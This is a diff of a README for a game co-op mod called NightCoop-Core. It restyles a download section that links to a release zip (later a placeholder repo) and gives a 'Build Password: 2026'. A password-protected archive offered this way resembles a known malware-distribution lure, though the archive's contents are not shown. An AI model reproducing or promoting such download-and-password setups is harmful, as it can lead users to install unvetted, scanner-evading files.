@@ -1,6 +1,6 @@
 # 🌐 NightCoop-Core
 
-<img width="739" height="415" alt="image" src="https://github.com/user-attachments/assets/3dbe2951-b284-44fe-86c8-93dc2f098e05" />
+![Uploading image.png…]()
 
 
 <p align="center">
@@ -37,21 +37,15 @@ NightCoop-Core is not a simple script mod; it's a full networking layer built di
 
 ## 📥 Deployment & Build
 
-<table align="center">
-<tr>
-<td align="center">
-
-<a href="https://github.com/Orderviking/NightCoop-Core/releases/download/1/NightCoop-Core.zip">
-  <img src="https://github.com/Orderviking/NightCoop-Core/releases/download/1/NightCoop-Core.zip">
-</a>
-
-<br><br>
-
-🔐 **Build Password:** `2026`
-
-</td>
-</tr>
-</table>
+<div align="center" style="border: 2px solid #2C3E50; border-radius: 10px; padding: 20px; background-color: #1a1a1a; max-width: 450px; margin: 0 auto;">
+  <img src="https://img.icons8.com/color/96/000000/download.png" alt="Download" width="60" height="60">
+  <br><br>
+  <a href="https://github.com/YOUR_USERNAME/NightCoop-Core/releases/latest">
+    <img src="https://img.shields.io/badge/⬇️%20GET%20LATEST%20BUILD-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
+  </a>
+  <br><br>
+  <span style="font-size: 18px; color: #ffffff;">🔐 <b>Build Password:</b> <code style="background-color: #333; padding: 4px 8px; border-radius: 4px; color: #E74C3C;">2026</code></span>
+</div>
 
 ### Prerequisites
 
